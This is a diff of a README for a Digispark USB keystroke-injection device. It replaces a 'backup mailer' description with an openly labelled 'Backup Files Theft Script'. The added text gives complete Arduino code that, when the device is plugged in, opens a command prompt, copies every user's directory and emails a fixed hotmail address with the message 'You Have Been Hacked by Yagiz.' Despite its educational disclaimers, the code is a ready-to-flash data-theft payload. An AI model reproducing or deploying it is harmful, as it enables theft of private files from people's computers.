@@ -1,66 +1,75 @@
-# DigisparkBackupMailer
+# Backup Files Theft Script
 
-A simple and effective solution to automatically collect backup files from all users on a system using the Digispark microcontroller. The backup files are then sent to a predefined email address for safekeeping.
+## Description
 
-**Disclaimer:** This project is for educational and testing purposes only. It should not be used for malicious intent or unauthorized access. Always ensure you have explicit permission before running any security or automation tools on any system.
+This script is an example of a malicious code that steals backup files from all users on a device and sends them to a specified email address. The script utilizes the `DigiKeyboard` library to simulate keyboard actions for executing commands on a Windows system. Please note that using or distributing such code for illegal purposes is strictly prohibited and unethical.
 
-## Features
+**Disclaimer: This script is for educational purposes only.**
 
-- **Backup Collection:** Automatically copies files from all user directories to a designated backup folder.
-- **Email Sending:** Sends the backup files via email to a static email address.
-- **Platform:** Powered by the Digispark USB microcontroller.
-- **Lightweight:** Runs efficiently on small embedded devices like Digispark.
+## How It Works
 
-## Requirements
+1. **Stealing Backup Files:**
+   - The script opens the Command Prompt (`cmd`) using a keypress sequence.
+   - It uses the `xcopy` command to copy backup files from all users on the system to a folder (`C:\Backup\`).
 
-- **Digispark USB Development Board:** Ensure you have the Digispark board connected and properly configured.
-- **DigiKeyboard Library:** Used to simulate keyboard input.
-- **Microsoft Outlook:** Configured on the system for email sending (customizable for different email clients).
-- **Windows Operating System:** Designed for use on Windows platforms.
+2. **Sending the Files via Email:**
+   - After copying the files, the script opens Microsoft Outlook and creates a new email.
+   - The email is sent to a predefined static email address (in this case, `yagiz_aladag@hotmail.com`) with the subject "BackupFiles" and the message "You Have Been Hacked by Yagiz."
 
-## Setup and Usage
+## Code Walkthrough
 
-### 1. Clone or Download the Repository
+```cpp
+#include "DigiKeyboard.h"
 
-```bash
-git clone https://github.com/yourusername/DigisparkBackupMailer.git
-2. Install DigiKeyboard Library
-Open Arduino IDE.
-Go to Sketch > Include Library > Manage Libraries.
-Search for DigiKeyboard and install it.
-3. Upload the Code to Digispark
-Open the DigisparkBackupMailer project in the Arduino IDE.
-Select the Digispark (Default - 16.5mhz) board from Tools > Board.
-Click Upload to flash the code onto your Digispark board.
-4. Run the Code
-Insert the Digispark device into a Windows machine. The script will automatically execute, copy backup files, and send them via email.
-Code Explanation
-Backup Process
-The code begins by running a command to copy all user directories (C:\Users*) to a local backup folder (C:\Backup). The xcopy command is used with flags to ensure all hidden files and permissions are maintained during the copy process.
+// Setup function: Initializes the keyboard actions
+void setup() {
+    DigiKeyboard.delay(500); 
+    DigiKeyboard.sendKeyStroke(0); 
+    DigiKeyboard.delay(500);
 
-Email Sending
-After completing the backup, the code opens Microsoft Outlook, creates a new email, and attaches the backup files. The email is sent to the static address defined in the script (e.g., yagiz_aladag@hotmail.com).
+    // Open Command Prompt
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
+    DigiKeyboard.delay(500);
+    DigiKeyboard.print("cmd");
+    DigiKeyboard.sendKeyStroke(KEY_CTRL_LEFT, MOD_SHIFT_LEFT); 
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(1000); 
 
-Keyboard Simulation
-The Digispark microcontroller emulates keyboard strokes to interact with the system's command line and Outlook. This is accomplished using the DigiKeyboard library, which simulates keypress events.
+    // Copy backup files
+    DigiKeyboard.print("xcopy C:\\Users\\* C:\\Backup\\ /E /H /K /Y");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER);
+    DigiKeyboard.delay(5000); 
 
-Warnings
-Permission
-This code should only be used on machines where you have explicit permission to perform such operations. Unauthorized access to systems or data is illegal and unethical.
+    // Open Outlook and send email
+    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); 
+    DigiKeyboard.delay(500);
+    DigiKeyboard.print("outlook");
+    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+    DigiKeyboard.delay(3000); 
+    DigiKeyboard.sendKeyStroke(KEY_N, MOD_CONTROL_LEFT); 
+    DigiKeyboard.delay(1000); 
+    DigiKeyboard.print("yagiz_aladag@hotmail.com");
+    DigiKeyboard.sendKeyStroke(KEY_TAB); 
+    DigiKeyboard.delay(500);
+    DigiKeyboard.print("BackupFiles");
+    DigiKeyboard.sendKeyStroke(KEY_TAB); 
+    DigiKeyboard.delay(500);
+    DigiKeyboard.print("You Have Been Hacked by Yagiz.");
+    DigiKeyboard.sendKeyStroke(KEY_TAB); 
+    DigiKeyboard.delay(500);
+    DigiKeyboard.sendKeyStroke(KEY_ENTER); 
+}
 
-Security
-This project is intended for educational purposes only and should not be used in real-world malicious activities. Use it responsibly.
-
+void loop() {
+    // No loop needed for this task
+}
+Important Notes
+Ethical Use: This code is not intended for use in real-world scenarios. It showcases how a malicious actor could exploit automated keystrokes to perform harmful actions. Use of this code without consent is illegal.
+Security: Always ensure your devices are secure and take proper measures to prevent unauthorized access.
 License
-This project is licensed under the MIT License - see the LICENSE file for details.
+This project is for educational purposes only. It is important to comply with ethical standards and legal requirements when using or distributing code.
 
-Author
-Yagiz Aladag
-Email: yagiz_aladag@hotmail.com
+Warning
+This code should never be used for malicious intent. Always ensure that your work aligns with ethical guidelines and legal standards. The script shown here is to demonstrate how vulnerabilities in system security can be exploited.
 
-Final Note
-The DigisparkBackupMailer project demonstrates how embedded devices like Digispark can be used to automate simple tasks. Be mindful of privacy and legality when experimenting with such projects.
-
-
-
-arduino
+For more information, refer to DigiKeyboard Documentation.
